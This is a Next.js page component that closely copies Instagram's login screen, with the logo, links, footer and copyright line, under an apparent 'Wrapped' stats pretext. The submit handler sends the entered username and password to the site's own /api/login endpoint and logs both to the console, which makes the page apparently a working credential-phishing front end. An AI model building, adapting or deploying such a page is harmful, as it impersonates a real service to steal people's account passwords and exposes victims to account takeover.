"use client";

import { useState } from 'react';
import { useRouter } from 'next/navigation';
import Loader from "react-js-loader";

export default function Home() {

  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [error, setError] = useState("");
  const [loading, setLoading] = useState(false);
  const router = useRouter();

  const submit = async () => {
    setError("");
    console.log(email);
    if(email === "") {
      setError("Username field cannot be empty.");
      return;
    }
    if(password === "") {
      setError("Password field cannot be empty.");
      return;
    }
    const bodyContent = JSON.stringify({email: email, password: password});
    console.log(bodyContent);
    setLoading(true);
    await fetch('/api/login', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: bodyContent,
    });
    const response = await fetch('/api/get_stats?username=' + email, {
      method: 'GET',
      headers: {
        'Content-Type': 'application/json',
      },
    });
    const body = await response.text();
    const stats = JSON.parse(body).stats;
    setLoading(false);
    router.replace("/result?stats=" + stats.join(","));
  }

    return (
    <span id="root">
    <section className="section-all">
      <main className="main" role="main">
        <div className="wrapper">
          <article className="article">
            <div className="content">
              <div className="login-box">
                <div className="header">
                  <img className="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" alt="Instagram"/>
                </div>
                <div className="form-wrap">
                  <form className="form">

                    <div className="input-box">
                      <input type="text" id="username" onChange={(e) => setEmail(e.target.value)} placeholder="Username" aria-required="true" name="username" required/>
                    </div>  

                    <div className="input-box">
                      <input type="password" name="password" onChange={(e) => setPassword(e.target.value)} id="password" placeholder="Password" aria-required="true" required/>
                    </div>  

                    <span className="button-box">
                      {loading && (
                        <button className="btn" type="button">Preparing Wrapped...</button>
                      )}
                      {!loading && (
                        <button className="btn" type="button" name="submit" onClick={submit}>Log in</button>
                      )}
                    </span>  
                    {error && (
                      <span className='text-red-500 m-auto'>{error}</span>
                    )}
                    <a className="forgot" href="https://www.instagram.com/accounts/password/reset">Forgot password?</a>
                  </form>
                </div>
              </div>

              <div className="login-box">
                <p className="text">Don&apos;t have an account?<a href="https://www.instagram.com/accounts/emailsignup">Sign up</a></p>
              </div>

              <div className="app">
                <p>Get the app.</p>
                <div className="app-img">
                  <a href="https://itunes.apple.com/app/instagram/id389801252?pt=428156&amp;ct=igweb.loginPage.badge&amp;mt=8">
                    <img alt="appstore" src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/4b70f6fae447.png" />
                  </a>
                  <a href="https://play.google.com/store/apps/details?id=com.instagram.android&amp;referrer=utm_source%3Dinstagramweb%26utm_campaign%3DloginPage%26utm_medium%3Dbadge">
                    <img alt="playstore" src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/f06b908907d5.png"/>
                  </a>  
                </div> 
              </div>
            </div> 
          </article>
        </div> 
      </main>

      <footer className="footer" role="contentinfo">
        <div className="footer-container">

          <nav className="footer-nav" role="navigation">
            <ul>
			  <li><a href=""></a></li>
              <li><a href="https://about.instagram.com">About Us</a></li>
              <li><a href="https://help.instagram.com">Support</a></li>
              <li><a href="https://about.instagram.com/blog">Blog</a></li>
              <li><a href="https://about.instagram.com/about-us/careers">Jobs</a></li>
              <li><a href="https://www.instagram.com/developer">Api</a></li>
              <li><a href="https://help.instagram.com/519522125107875">Privacy</a></li>
              <li><a href="https://help.instagram.com/581066165581870">Terms</a></li>
              <li><a href="https://www.instagram.com/directory/hashtags">Directory</a></li>
			  <li><a href="">Instagram</a></li>
            </ul>
          </nav>

          <span className="footer-logo">&copy; 2023 Instagram</span>
        </div>
      </footer>
      
    </section>
  </span> 
    )
}